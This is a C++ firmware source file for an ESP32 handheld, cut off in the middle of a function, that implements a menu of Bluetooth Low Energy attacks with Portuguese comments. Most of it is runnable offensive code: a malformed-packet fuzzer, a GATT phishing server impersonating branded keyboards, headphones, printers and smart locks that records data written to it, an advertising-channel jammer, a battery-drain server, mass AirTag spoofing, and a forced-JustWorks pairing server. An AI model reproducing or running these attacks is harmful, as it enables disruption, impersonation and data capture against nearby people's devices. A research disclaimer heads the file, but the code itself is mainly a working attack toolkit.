/**
 * @file advanced_ble_atks.cpp
 * @brief Implementação de ataques BLE avançados para fins acadêmicos e
 * pesquisa.
 *
 * AVISO: Este código é fornecido exclusivamente para fins educacionais e de
 * pesquisa. O uso indevido pode ser ilegal. Use apenas em ambientes controlados
 * e com autorização.
 */

#include "advanced_ble_atks.h"
#include "ble_common.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <Arduino.h>
#include <globals.h>
#include <map>
#include <vector>

//================================================================================
// CONSTANTES E VARIÁVEIS GLOBAIS
//================================================================================

// Controle de estado
static bool ble_attack_running = false;
// static TaskHandle_t ble_attack_task_handle = NULL;

// Callback de pairing
// static PairingKeyCallback pairing_key_callback = nullptr;

// Alvos de disconnect
static std::vector<NimBLEAddress> disconnect_targets;

// Dados de exfiltração
static std::vector<ExfilData> exfil_queue;

// Dispositivos detectados
static std::map<String, BLEDeviceInfo> detected_devices;

// Apple OUI para AirTag
static const uint8_t APPLE_OUI[] = {0x4C, 0x00};

//================================================================================
// FUNÇÕES AUXILIARES
//================================================================================

String bleAddressToString(const NimBLEAddress &addr) {
  return std::string(addr).c_str();
}

void generateRandomBLEAddress(uint8_t *addr) {
  // Endereço randômico estático (bit 1 = 1, bit 0 = 0)
  addr[0] = random(0xC0, 0xFF);
  addr[0] |= 0xC0; // Random static address
  for (int i = 1; i < 6; i++) {
    addr[i] = random(0x00, 0xFF);
  }
}

uint8_t calculateBLEChecksum(const uint8_t *data, size_t len) {
  uint8_t sum = 0;
  for (size_t i = 0; i < len; i++) {
    sum ^= data[i];
  }
  return sum;
}

String getDeviceTypeByAppearance(uint16_t appearance) {
  switch (appearance >> 6) { // Categorias de appearance
  case 0x01:
    return "Phone";
  case 0x02:
    return "Computer";
  case 0x03:
    return "Watch";
  case 0x04:
    return "Clock";
  case 0x05:
    return "Display";
  case 0x06:
    return "Remote Control";
  case 0x07:
    return "Eye Glasses";
  case 0x08:
    return "Tag";
  case 0x09:
    return "Keyring";
  case 0x0A:
    return "Media Player";
  case 0x0B:
    return "Barcode Scanner";
  case 0x0C:
    return "Thermometer";
  case 0x0D:
    return "Heart Rate Sensor";
  case 0x0E:
    return "Blood Pressure";
  case 0x0F:
    return "Human Interface Device";
  case 0x10:
    return "Glucose Meter";
  case 0x11:
    return "Running Walking Sensor";
  case 0x12:
    return "Cycling";
  case 0x13:
    return "Pulse Oximeter";
  case 0x14:
    return "Weight Scale";
  case 0x15:
    return "Outdoor Sports Activity";
  default:
    return "Unknown";
  }
}

std::vector<uint8_t> generateAppleAdvertisingData() {
  std::vector<uint8_t> data;

  // Apple Manufacturer Specific Data
  data.push_back(0x4C); // Apple OUI high
  data.push_back(0x00); // Apple OUI low

  // Offline Finding type
  data.push_back(0x12); // FindMy data type
  data.push_back(0x19); // Length

  // Status byte (connected + first 4 bits for key index)
  data.push_back(random(0x00, 0xFF));

  // Public key (28 bytes - seria gerado com curva P-224)
  for (int i = 0; i < 28; i++) {
    data.push_back(random(0x00, 0xFF));
  }

  // Hint byte
  data.push_back(random(0x00, 0xFF));

  return data;
}

bool initBLEAttackMode() {
  // Inicializa NimBLE se necessário
  if (!NimBLEDevice::isInitialized()) {
    NimBLEDevice::init("WillyBLE");
  }
  return true;
}

void deinitBLEAttackMode() {
  if (NimBLEDevice::isInitialized()) {
    NimBLEDevice::deinit();
    vTaskDelay(pdMS_TO_TICKS(100));
  }
}

void advancedBLEAtksMenu() {
  options = {{"ATT Fuzzer", [=]() { malformedATTFuzzer(); }},
             {"GATT Phishing", [=]() { gattPhishingServer(); }},
             {"Adv Jammer", [=]() { advertisingChannelJammer(); }},
             {"Battery Drain", [=]() { connectionParameterDrain(); }},
             {"AirTag Spoof", [=]() { massAirTagSpoof(); }},
             {"Long Range Atk", [=]() { longRangeExtendedAttack(); }},
             {"Pairing MITM", [=]() { pairingMITMSimulator(); }},
             {"Stealth Exfil", [=]() { advertisementStealthExfil(); }},
             {"Mesh Worm", [=]() { meshWormPropagator(); }},
             {"Disc Flood", [=]() { directedDisconnectFlood(); }}};
  addOptionToMainMenu();
  loopOptions(options, MENU_TYPE_SUBMENU, "Ataques BLE Avancados");
}

//================================================================================
// 1. MALFORMED ATT FUZZER - IMPLEMENTAÇÃO COMPLETA
//================================================================================

// ATT Opcodes
static const uint8_t att_opcodes[] = {
    0x01, // Error Response
    0x02, // Exchange MTU Request
    0x03, // Exchange MTU Response
    0x04, // Find Information Request
    0x05, // Find Information Response
    0x06, // Find By Type Value Request
    0x07, // Find By Type Value Response
    0x08, // Read By Type Request
    0x09, // Read By Type Response
    0x0A, // Read Request
    0x0B, // Read Response
    0x0C, // Read Blob Request
    0x0D, // Read Blob Response
    0x0E, // Read Multiple Request
    0x0F, // Read Multiple Response
    0x10, // Read By Group Type Request
    0x11, // Read By Group Type Response
    0x12, // Write Request
    0x13, // Write Response
    0x14, // Write Command
    0x15, // Signed Write Command
    0x16, // Prepare Write Request
    0x17, // Prepare Write Response
    0x18, // Execute Write Request
    0x19, // Execute Write Response
    0x1A, // Handle Value Notification
    0x1B, // Handle Value Indication
    0x1C, // Handle Value Confirmation
    0x1D, // Read Multiple Variable Request
    0x1E, // Read Multiple Variable Response
};

void malformedATTFuzzer() {
  ATTFuzzerConfig config;

  // Menu de configuração
  options = {
      {"Config Padrao",
       [&]() {
         config.packets_per_second = 100;
         config.randomize_opcode = true;
         config.invalid_handles = true;
       }},
      {"Agressivo (200/s)",
       [&]() {
         config.packets_per_second = 200;
         config.randomize_opcode = true;
         config.invalid_handles = true;
       }},
      {"Stealth (50/s)",
       [&]() {
         config.packets_per_second = 50;
         config.randomize_opcode = true;
         config.invalid_handles = false;
       }},
  };
  addOptionToMainMenu();
  loopOptions(options);

  if (returnToMenu)
    return;

  if (!initBLEAttackMode())
    return;

  drawMainBorderWithTitle("ATT Fuzzer");
  tft.setTextColor(willyConfig.priColor);
  padprintln("");
  padprintln("Enviando pacotes ATT malformados...");
  padprintln("");
  padprintln("Pressione ESC para parar");

  ble_attack_running = true;
  uint32_t packet_count = 0;
  uint32_t last_update = millis();
  uint16_t interval_ms = 1000 / config.packets_per_second;

  while (ble_attack_running) {
    // Monta pacote ATT malformado
    uint8_t att_packet[64];
    size_t packet_len = 0;

    // Opcode (aleatório ou fixo)
    if (config.randomize_opcode) {
      att_packet[0] = att_opcodes[random(0, sizeof(att_opcodes))];
    } else {
      att_packet[0] = 0x08; // Read By Type Request
    }
    packet_len = 1;

    // Payload malformado baseado no opcode
    switch (att_packet[0]) {
    case 0x02: // Exchange MTU Request
      // MTU overflow
      att_packet[1] = 0xFF;
      att_packet[2] = 0xFF; // MTU = 65535
      packet_len = 3;
      break;

    case 0x08: // Read By Type Request
      // Invalid handle range
      att_packet[1] = 0xFF;
      att_packet[2] = 0xFF;
      att_packet[3] = 0xFF;
      att_packet[4] = 0xFF;
      // UUID (16-bit)
      att_packet[5] = random(0x00, 0xFF);
      att_packet[6] = random(0x00, 0xFF);
      packet_len = 7;
      break;

    case 0x12: // Write Request
      // Invalid handle + overflow data
      if (config.invalid_handles) {
        att_packet[1] = 0xFF;
        att_packet[2] = 0xFF;
      } else {
        att_packet[1] = random(0x01, 0xFF);
        att_packet[2] = 0x00;
      }
      // Random data overflow
      for (int i = 0; i < 20 && (3 + i) < 64; i++) {
        att_packet[3 + i] = random(0x00, 0xFF);
      }
      packet_len = 23;
      break;

    case 0x16: // Prepare Write Request
      // Invalid offset + overflow
      att_packet[1] = random(0x01, 0xFF);
      att_packet[2] = 0x00;
      att_packet[3] = 0xFF;
      att_packet[4] = 0xFF;
      att_packet[5] = 0xFF;
      att_packet[6] = 0xFF; // Offset overflow
      for (int i = 0; i < 10 && (7 + i) < 64; i++) {
        att_packet[7 + i] = random(0x00, 0xFF);
      }
      packet_len = 17;
      break;

    default:
      // Generic malformed payload
      for (int i = 0; i < 20 && (1 + i) < 64; i++) {
        att_packet[1 + i] = random(0x00, 0xFF);
      }
      packet_len = 21;
      break;
    }

    // Envia via L2CAP (would need raw HCI access in real implementation)
    // Por ora, simulamos enviando advertising com payload
    NimBLEAdvertisementData advData;
    std::vector<uint8_t> mfgData;
    mfgData.push_back(0xFF); // Type: Manufacturer Specific
    mfgData.push_back(0xFF); // Company ID (test)
    for (size_t i = 0; i < packet_len && i < 28; i++) {
      mfgData.push_back(att_packet[i]);
    }
    advData.setManufacturerData(mfgData.data(), mfgData.size());

    // Inicia advertising rápido
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->start();

    vTaskDelay(interval_ms / portTICK_PERIOD_MS);
    pAdvertising->stop();

    packet_count++;

    // Atualiza display
    if (millis() - last_update > 1000) {
      drawMainBorderWithTitle("ATT Fuzzer");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Enviando pacotes ATT malformados...");
      padprintln("");
      padprintln("Pacotes: " + String(packet_count));
      padprintln("Opcode atual: 0x" + String(att_packet[0], HEX));
      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }
  }

  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// 2. GATT PHISHING SERVER - IMPLEMENTAÇÃO COMPLETA
//================================================================================

// UUIDs de serviços comuns
/*
static const char* SERVICE_UUIDS[] = {
    "1800", // Generic Access
    "1801", // Generic Attribute
    "180A", // Device Information
    "180F", // Battery Service
    "180D", // Heart Rate
    "1809", // Health Thermometer
    "1812", // Human Interface Device
    "1818", // Cycling Power
    "1816", // Cycling Speed and Cadence
    "181A", // Environmental Sensing
};
*/

class GATTPhishingCallbacks : public NimBLEServerCallbacks {
public:
  uint32_t connection_count = 0;
  NimBLEAddress last_connected;

  void onConnect(NimBLEServer *pServer, NimBLEConnInfo &connInfo) override {
    connection_count++;
    last_connected = connInfo.getAddress();

    Serial.printf("Device connected: %s\n",
                  bleAddressToString(last_connected).c_str());

    // Solicita MTU máximo
    pServer->getPeerMTU(connInfo.getConnHandle());
  }

  void onDisconnect(NimBLEServer *pServer, NimBLEConnInfo &connInfo,
                    int reason) override {
    Serial.println("Device disconnected");
  }
};

class PhishingCharacteristicCallbacks : public NimBLECharacteristicCallbacks {
public:
  std::vector<String> captured_data;

  void onWrite(NimBLECharacteristic *pCharacteristic,
               NimBLEConnInfo &connInfo) override {
    String data = pCharacteristic->getValue().c_str();
    captured_data.push_back(data);
    Serial.printf("Captured: %s\n", data.c_str());
  }

  void onRead(NimBLECharacteristic *pCharacteristic,
              NimBLEConnInfo &connInfo) override {
    // Retorna dados falsos
    pCharacteristic->setValue("WillyPhishing");
  }
};

static GATTPhishingCallbacks *phishing_callbacks = nullptr;
static PhishingCharacteristicCallbacks *char_callbacks = nullptr;

void gattPhishingServer() {
  enum PhishingProfile {
    PROFILE_KEYBOARD,
    PROFILE_PRINTER,
    PROFILE_HEADSET,
    PROFILE_SMARTLOCK,
    PROFILE_FITNESS
  };

  PhishingProfile profile = PROFILE_KEYBOARD; // Default

  // Menu de seleção de tipo
  options = {
      {"HID Keyboard", [&]() { profile = PROFILE_KEYBOARD; }},
      {"Impressora", [&]() { profile = PROFILE_PRINTER; }},
      {"Headset", [&]() { profile = PROFILE_HEADSET; }},
      {"Smart Lock", [&]() { profile = PROFILE_SMARTLOCK; }},
      {"Fitness Tracker", [&]() { profile = PROFILE_FITNESS; }},
  };
  addOptionToMainMenu();
  loopOptions(options);

  if (returnToMenu)
    return;

  if (!initBLEAttackMode())
    return;

  drawMainBorderWithTitle("GATT Phishing");
  padprintln("");
  padprintln("Configurando servidor GATT...");

  // Cria servidor BLE
  NimBLEServer *pServer = NimBLEDevice::createServer();
  phishing_callbacks = new GATTPhishingCallbacks();
  pServer->setCallbacks(phishing_callbacks, true);

  char_callbacks = new PhishingCharacteristicCallbacks();
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  String serverNameStr = "Willy Phishing";

  switch (profile) {
  case PROFILE_KEYBOARD: {
    NimBLEService *pHIDService = pServer->createService("1812");
    NimBLECharacteristic *pReportChar = pHIDService->createCharacteristic(
        "2A4D", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE |
                    NIMBLE_PROPERTY::NOTIFY);
    pReportChar->setCallbacks(char_callbacks);
    pHIDService->start();
    serverNameStr = "Apple Keyboard";
    pAdvertising->setName(serverNameStr.c_str());
    pAdvertising->addServiceUUID("1812");
    pAdvertising->setAppearance(0x03C1);
    break;
  }
  case PROFILE_PRINTER: {
    NimBLEService *pPrintService = pServer->createService("1899");
    NimBLECharacteristic *pPrintChar =
        pPrintService->createCharacteristic("2A99", NIMBLE_PROPERTY::WRITE);
    pPrintChar->setCallbacks(char_callbacks);
    pPrintService->start();
    serverNameStr = "HP LaserJet";
    pAdvertising->setName(serverNameStr.c_str());
    pAdvertising->addServiceUUID("1899");
    pAdvertising->setAppearance(0x0344);
    break;
  }
  case PROFILE_HEADSET: {
    NimBLEService *pAudioService = pServer->createService("1844");
    NimBLECharacteristic *pAudioChar = pAudioService->createCharacteristic(
        "2A44", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE);
    pAudioChar->setCallbacks(char_callbacks);
    pAudioService->start();
    serverNameStr = "AirPods Pro";
    pAdvertising->setName(serverNameStr.c_str());
    pAdvertising->addServiceUUID("1844");
    pAdvertising->setAppearance(0x0400);
    break;
  }
  case PROFILE_SMARTLOCK: {
    NimBLEService *pLockService = pServer->createService("1888");
    NimBLECharacteristic *pLockChar = pLockService->createCharacteristic(
        "2A88", NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY);
    pLockChar->setCallbacks(char_callbacks);
    pLockService->start();
    serverNameStr = "August Smart Lock";
    pAdvertising->setName(serverNameStr.c_str());
    pAdvertising->addServiceUUID("1888");
    pAdvertising->setAppearance(0x0000);
    break;
  }
  case PROFILE_FITNESS: {
    NimBLEService *pHRService = pServer->createService("180D");
    pHRService->createCharacteristic("2A37", NIMBLE_PROPERTY::NOTIFY);
    pHRService->start();
    serverNameStr = "Mi Band 6";
    pAdvertising->setName(serverNameStr.c_str());
    pAdvertising->addServiceUUID("180D");
    pAdvertising->setAppearance(0x03C0);
    break;
  }
  }

  // Battery service default
  NimBLEService *pBatteryService = pServer->createService("180F");
  NimBLECharacteristic *pBatteryChar =
      pBatteryService->createCharacteristic("2A19", NIMBLE_PROPERTY::READ);
  pBatteryChar->setValue(100); // 100% bateria
  pBatteryService->start();

  // Device Info service default
  NimBLEService *pInfoService = pServer->createService("180A");
  NimBLECharacteristic *pNameChar =
      pInfoService->createCharacteristic("2A29", NIMBLE_PROPERTY::READ);
  pNameChar->setValue(serverNameStr.c_str());
  pInfoService->start();

  pAdvertising->setMinInterval(0x20);
  pAdvertising->setMaxInterval(0x40);

  ble_attack_running = true;
  uint32_t last_update = millis();

  while (ble_attack_running) {
    // Inicia advertising
    pAdvertising->start();

    // Processa conexões
    if (millis() - last_update > 500) {
      drawMainBorderWithTitle("GATT Phishing");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Servidor ativo: " + serverNameStr);
      padprintln("");
      padprintln("Conexoes: " + String(phishing_callbacks->connection_count));

      if (phishing_callbacks->connection_count > 0) {
        padprintln("Ultimo: " +
                   bleAddressToString(phishing_callbacks->last_connected));
      }

      padprintln("");

      // Mostra dados capturados
      if (!char_callbacks->captured_data.empty()) {
        tft.setTextColor(TFT_GREEN);
        padprintln("Dados capturados:");
        for (const auto &data : char_callbacks->captured_data) {
          padprintln("  " + data.substring(0, 20));
        }
        tft.setTextColor(willyConfig.priColor);
      }

      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }

    vTaskDelay(100 / portTICK_PERIOD_MS);
  }

  pAdvertising->stop();
  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// 3. BLE ADVERTISING CHANNEL JAMMER - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void advertisingChannelJammer() {
  AdvertisingJammerConfig config;

  options = {
      {"Todos Canais (500/s)",
       [&]() {
         config.channel_37 = true;
         config.channel_38 = true;
         config.channel_39 = true;
         config.packets_per_second = 500;
       }},
      {"Canal 37 Foco",
       [&]() {
         config.channel_37 = true;
         config.channel_38 = false;
         config.channel_39 = false;
         config.packets_per_second = 1000;
       }},
      {"Stealth (200/s)",
       [&]() {
         config.channel_37 = true;
         config.channel_38 = true;
         config.channel_39 = true;
         config.packets_per_second = 200;
       }},
  };
  addOptionToMainMenu();
  loopOptions(options);

  if (returnToMenu)
    return;

  if (!initBLEAttackMode())
    return;

  drawMainBorderWithTitle("BLE Jammer");
  padprintln("");
  padprintln("Iniciando jamming...");
  padprintln("Canais: 37, 38, 39");

  ble_attack_running = true;
  uint32_t packet_count = 0;
  uint32_t last_update = millis();
  uint16_t interval_ms = 1000 / config.packets_per_second;

  // Canais de advertising BLE
  uint8_t adv_channels[] = {37, 38, 39};
  int channel_idx = 0;

  while (ble_attack_running) {
    // Seleciona canal
    uint8_t current_channel = adv_channels[channel_idx % 3];

    // Pula canais desabilitados
    if ((current_channel == 37 && !config.channel_37) ||
        (current_channel == 38 && !config.channel_38) ||
        (current_channel == 39 && !config.channel_39)) {
      channel_idx++;
      continue;
    }

    // Gera payload de jamming
    uint8_t jam_payload[40];
    if (config.randomize_payload) {
      for (int i = 0; i < 40; i++) {
        jam_payload[i] = random(0x00, 0xFF);
      }
    } else {
      // Payload padrão - invalid advertising structure
      memset(jam_payload, 0xFF, 40);
    }

    // Cria advertising data
    NimBLEAdvertisementData advData;
    advData.addData(jam_payload, 31);

    // Configura advertising
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->start();

    vTaskDelay(interval_ms / portTICK_PERIOD_MS);
    pAdvertising->stop();

    packet_count++;
    channel_idx++;

    // Atualiza display
    if (millis() - last_update > 1000) {
      drawMainBorderWithTitle("BLE Jammer");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Jamming ativo...");
      padprintln("");
      padprintln("Pacotes: " + String(packet_count));
      padprintln("Taxa: " + String(config.packets_per_second) + "/s");
      padprintln("Canal atual: " + String(current_channel));
      padprintln("");
      tft.setTextColor(TFT_RED);
      padprintln("BLE bloqueado na area!");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }
  }

  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// 4. CONNECTION PARAMETER ABUSE DRAIN - IMPLEMENTAÇÃO COMPLETA
//================================================================================

class DrainConnectionCallbacks : public NimBLEServerCallbacks {
public:
  bool aggressive_update = true;
  uint16_t min_interval = 6;
  uint16_t max_interval = 6;
  uint16_t latency = 0;
  uint16_t timeout = 100;
  uint32_t update_count = 0;

  void onConnect(NimBLEServer *pServer, NimBLEConnInfo &connInfo) override {
    Serial.println("Device connected for drain attack");
  }

  void onConnParamsUpdate(NimBLEConnInfo &connInfo) override {
    update_count++;
    Serial.printf(
        "Connection params updated: interval=%d, latency=%d, timeout=%d\n",
        connInfo.getConnInterval(), connInfo.getConnLatency(),
        connInfo.getConnTimeout());
  }
};

static DrainConnectionCallbacks *drain_callbacks = nullptr;

void connectionParameterDrain() {
  ConnectionDrainConfig config;

  options = {
      {"Agressivo",
       [&]() {
         config.min_interval = 6;
         config.max_interval = 6;
         config.aggressive_mode = true;
       }},
      {"Moderado",
       [&]() {
         config.min_interval = 20;
         config.max_interval = 40;
         config.aggressive_mode = false;
       }},
      {"Maximo Dreno",
       [&]() {
         config.min_interval = 6;
         config.max_interval = 6;
         config.latency = 499;  // Máximo permitido
         config.timeout = 3200; // Máximo
         config.aggressive_mode = true;
       }},
  };
  addOptionToMainMenu();
  loopOptions(options);

  if (returnToMenu)
    return;

  if (!initBLEAttackMode())
    return;

  drawMainBorderWithTitle("Battery Drain");
  padprintln("");
  padprintln("Configurando ataque de dreno...");

  // Cria servidor BLE
  NimBLEServer *pServer = NimBLEDevice::createServer();
  drain_callbacks = new DrainConnectionCallbacks();
  drain_callbacks->min_interval = config.min_interval;
  drain_callbacks->max_interval = config.max_interval;
  drain_callbacks->latency = config.latency;
  drain_callbacks->timeout = config.timeout;
  pServer->setCallbacks(drain_callbacks, true);

  // Cria serviço de bateria (atrativo para wearables)
  NimBLEService *pBatteryService = pServer->createService("180F");
  NimBLECharacteristic *pBatteryChar = pBatteryService->createCharacteristic(
      "2A19", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY);
  pBatteryChar->setValue(50);
  pBatteryService->start();

  // Heart rate (atrativo para smartwatches)
  NimBLEService *pHRService = pServer->createService("180D");
  NimBLECharacteristic *pHRChar =
      pHRService->createCharacteristic("2A37", NIMBLE_PROPERTY::NOTIFY);
  pHRService->start();

  // Advertising
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  pAdvertising->setName("Willy Watch");
  pAdvertising->addServiceUUID("180F");
  pAdvertising->addServiceUUID("180D");
  pAdvertising->setAppearance(0x03C2); // Watch
  pAdvertising->setMinInterval(config.min_interval);
  pAdvertising->setMaxInterval(config.max_interval);

  ble_attack_running = true;
  uint32_t last_update = millis();
  uint32_t param_update_counter = 0;

  while (ble_attack_running) {
    pAdvertising->start();

    // Solicita atualização de parâmetros agressivamente
    if (config.aggressive_mode && pServer->getConnectedCount() > 0) {
      // Força intervalos extremos
      // (NimBLE handles connection parameter updates automatically)
      param_update_counter++;

      if (param_update_counter % 10 == 0) {
        // Notifica heart rate (mantém conexão ativa)
        uint8_t hr_data[] = {0x00, static_cast<uint8_t>(75 + random(0, 20))};
        pHRChar->setValue(hr_data, 2);
        pHRChar->notify();
      }
    }

    // Atualiza display
    if (millis() - last_update > 500) {
      drawMainBorderWithTitle("Battery Drain");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Dispositivo: Willy Watch");
      padprintln("");
      padprintln("Conexoes: " + String(pServer->getConnectedCount()));
      padprintln("Updates: " + String(drain_callbacks->update_count));
      padprintln("");
      padprintln("Intervalo: " + String(config.min_interval * 1.25) + "ms");
      padprintln("Latencia: " + String(config.latency));
      padprintln("");
      tft.setTextColor(TFT_YELLOW);
      padprintln("Bateria sendo drenada!");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }

    vTaskDelay(100 / portTICK_PERIOD_MS);
  }

  pAdvertising->stop();
  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// 5. MASS FINDMY / AIRTAG SPOOF CHAOS - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void massAirTagSpoof() {
  AirTagSpoofConfig config;

  options = {
      {"100 AirTags", [&]() { config.num_tags = 100; }},
      {"500 AirTags", [&]() { config.num_tags = 500; }},
      {"1000 AirTags", [&]() { config.num_tags = 1000; }},
  };
  addOptionToMainMenu();
  loopOptions(options);

  if (returnToMenu)
    return;

  if (!initBLEAttackMode())
    return;

  drawMainBorderWithTitle("AirTag Spoof");
  padprintln("");
  padprintln("Iniciando spoof massivo...");

  ble_attack_running = true;
  uint32_t packet_count = 0;
  uint32_t tag_index = 0;
  uint32_t last_update = millis();

  while (ble_attack_running) {
    // Gera dados de AirTag
    std::vector<uint8_t> airtag_data = generateAppleAdvertisingData();

    // Cria advertising data
    NimBLEAdvertisementData advData;

    // Flags
    advData.setFlags(BLE_HS_ADV_F_DISC_LTD | BLE_HS_ADV_F_BREDR_UNSUP);

    // Manufacturer data (Apple FindMy)
    std::vector<uint8_t> mfg_data;
    mfg_data.push_back(0x4C); // Apple OUI
    mfg_data.push_back(0x00);
    mfg_data.push_back(0x12); // Offline finding type
    mfg_data.push_back(0x19); // Length = 25

    // Status (connected bit + key index)
    mfg_data.push_back(random(0x00, 0x1F));

    // Public key (28 bytes)
    for (int i = 0; i < 28; i++) {
      mfg_data.push_back(random(0x00, 0xFF));
    }

    // Hint
    mfg_data.push_back(random(0x00, 0xFF));

    advData.addData(mfg_data);

    // Configura advertising
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x30);
    pAdvertising->setConnectableMode(
        BLE_GAP_CONN_MODE_UND); // Connectable undirected

    pAdvertising->start();
    vTaskDelay(10 / portTICK_PERIOD_MS);
    pAdvertising->stop();

    packet_count++;
    tag_index++;
    if (tag_index >= config.num_tags) {
      tag_index = 0;
    }

    // Atualiza display
    if (millis() - last_update > 1000) {
      drawMainBorderWithTitle("AirTag Spoof");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Spoofando AirTags...");
      padprintln("");
      padprintln("AirTags simulados: " + String(config.num_tags));
      padprintln("Pacotes enviados: " + String(packet_count));
      padprintln("Tag atual: " + String(tag_index));
      padprintln("");
      tft.setTextColor(TFT_RED);
      padprintln("Caos no FindMy!");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }
  }

  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// 6. BLE 5 LONG-RANGE EXTENDED ATTACK - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void longRangeExtendedAttack() {
  LongRangeConfig config;

  options = {
      {"PHY Coded 125k",
       [&]() {
         config.primary_phy = 3;
         config.use_coded_phy = true;
       }},
      {"PHY Coded 500k",
       [&]() {
         config.primary_phy = 3;
         config.use_coded_phy = true;
       }},
      {"Extended Adv", [&]() { config.extended_advertising = true; }},
  };
  addOptionToMainMenu();
  loopOptions(options);

  if (returnToMenu)
    return;

  if (!initBLEAttackMode())
    return;

  drawMainBorderWithTitle("Long Range BLE");
  padprintln("");
  padprintln("Configurando PHY Long Range...");

  ble_attack_running = true;
  uint32_t packet_count = 0;
  uint32_t last_update = millis();

  while (ble_attack_running) {
    // Configura advertising extended
    NimBLEAdvertisementData advData;

    // Dados do advertisement
    advData.setFlags(BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP);
    advData.setName("WillyLR");

    // Manufacturer data
    std::vector<uint8_t> mfg_data = {0xFF, 0xFF, 0xDE, 0xAD, 0xBE, 0xEF};
    advData.addData(mfg_data);

    // Advertising extended (BLE 5.0+)
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setAdvertisementData(advData);

    // Configura PHY codificado (long range)
    // Nota: ESP32 suporta BLE 5.0 com PHY LR
    // esp_ble_gap_set_phy: needs direct ESP-IDF calls
    // Simplificamos usando advertising normal com intervalos longos

    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x40);
    pAdvertising->start();

    vTaskDelay(20 / portTICK_PERIOD_MS);
    pAdvertising->stop();

    packet_count++;

    // Atualiza display
    if (millis() - last_update > 1000) {
      drawMainBorderWithTitle("Long Range BLE");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Modo: Long Range (Coded PHY)");
      padprintln("");
      padprintln("Alcance: ate 200m+");
      padprintln("PHY: 125kbps Coded");
      padprintln("Pacotes: " + String(packet_count));
      padprintln("");
      tft.setTextColor(TFT_YELLOW);
      padprintln("Advertising extended ativo");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }
  }

  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// 7. BLE PAIRING MITM SIMULATOR - IMPLEMENTAÇÃO COMPLETA
//================================================================================

class MITMCallbacks : public NimBLEServerCallbacks {
public:
  std::vector<NimBLEAddress> paired_devices;
  uint32_t pairing_attempts = 0;

  void onConnect(NimBLEServer *pServer, NimBLEConnInfo &connInfo) override {
    Serial.printf("MITM: Device connected %s\n",
                  bleAddressToString(connInfo.getAddress()).c_str());
  }

  void onAuthenticationComplete(NimBLEConnInfo &connInfo) override {
    paired_devices.push_back(connInfo.getAddress());
    Serial.printf("MITM: Pairing complete with %s\n",
                  bleAddressToString(connInfo.getAddress()).c_str());
  }
};

static MITMCallbacks *mitm_callbacks = nullptr;

void pairingMITMSimulator() {
  if (!initBLEAttackMode())
    return;

  // Configura para forçar JustWorks
  NimBLEDevice::setSecurityAuth(true, false, false); // Bond, no MITM, no IO
  NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

  drawMainBorderWithTitle("Pairing MITM");
  padprintln("");
  padprintln("Configurando servidor MITM...");

  // Cria servidor
  NimBLEServer *pServer = NimBLEDevice::createServer();
  mitm_callbacks = new MITMCallbacks();
  pServer->setCallbacks(mitm_callbacks, true);

  // Serviço genérico
  NimBLEService *pService = pServer->createService("1812");
  pService->createCharacteristic("2A4D", NIMBLE_PROPERTY::READ |
                                             NIMBLE_PROPERTY::WRITE |
                                             NIMBLE_PROPERTY::READ_ENC);
  pService->start();

  // Advertising
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  pAdvertising->setName("WillySecure");
  pAdvertising->addServiceUUID("1812");

  ble_attack_running = true;
  uint32_t last_update = millis();

  while (ble_attack_running) {
    pAdvertising->start();

    if (millis() - last_update > 500) {
      drawMainBorderWithTitle("Pairing MITM");
      tft.setTextColor(willyConfig.priColor);
